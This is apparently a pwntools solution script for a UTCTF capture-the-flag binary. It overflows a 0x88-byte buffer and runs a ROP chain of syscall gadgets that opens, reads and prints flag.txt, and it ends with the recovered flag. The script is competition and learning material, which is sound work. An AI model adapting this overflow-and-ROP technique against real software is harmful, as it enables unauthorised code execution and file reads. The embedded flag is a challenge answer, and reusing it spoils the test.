from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./chal', '''
    b *0x41ae16
    continue
''')

# p = remote('challenge.utctf.live', 5141)

# ROP to retrieve flag (open, read, write, exit)
# syscall numbers
SYS_READ = 0
SYS_WRITE = 1
SYS_OPEN = 2
SYS_EXIT = 60
# gadgets for setting up syscalls
POP_RAX_RET = 0x450507
POP_RDI_RET = 0x40204f
POP_RSI_RET = 0x40a0be
POP_RDX_RBX_RET = 0x48630b
SYSCALL_RET = 0x41ae16
# addresses in bss section for filename and buffer
FILENAME_ADDR = 0x4c82a0
BUFFER_ADDR = 0x4c82a0+0x10
# ROP chain
chain = [
    # read(0, FILENAME_ADDR, 16)
    POP_RAX_RET, SYS_READ,
    POP_RDI_RET, 0,
    POP_RSI_RET, FILENAME_ADDR,
    POP_RDX_RBX_RET, 16, 0,
    SYSCALL_RET,
    # open(FILENAME_ADDR, 0)
    POP_RAX_RET, SYS_OPEN,
    POP_RDI_RET, FILENAME_ADDR,
    POP_RSI_RET, 0,
    POP_RDX_RBX_RET, 0, 0,
    SYSCALL_RET,
    # read(3, BUFFER_ADDR, 100)
    # rdi=5 for remote
    POP_RDI_RET, 3,
    POP_RAX_RET, SYS_READ,
    POP_RSI_RET, BUFFER_ADDR,
    POP_RDX_RBX_RET, 100, 0,
    SYSCALL_RET,
    # write(1, BUFFER_ADDR, 100)
    POP_RAX_RET, SYS_WRITE,
    POP_RDI_RET, 1,
    POP_RSI_RET, BUFFER_ADDR,
    POP_RDX_RBX_RET, 100, 0,
    SYSCALL_RET,
    # exit(0)
    POP_RAX_RET, SYS_EXIT,
    POP_RDI_RET, 0,
    SYSCALL_RET,
]
p.sendafter(b"Input> ", b'\x00'*0x88+b''.join(p64(c) for c in chain))
p.sendafter(b"Flag: ", b'./flag.txt\x00')

p.interactive()

# utflag{r0p_with_4_littl3_catch}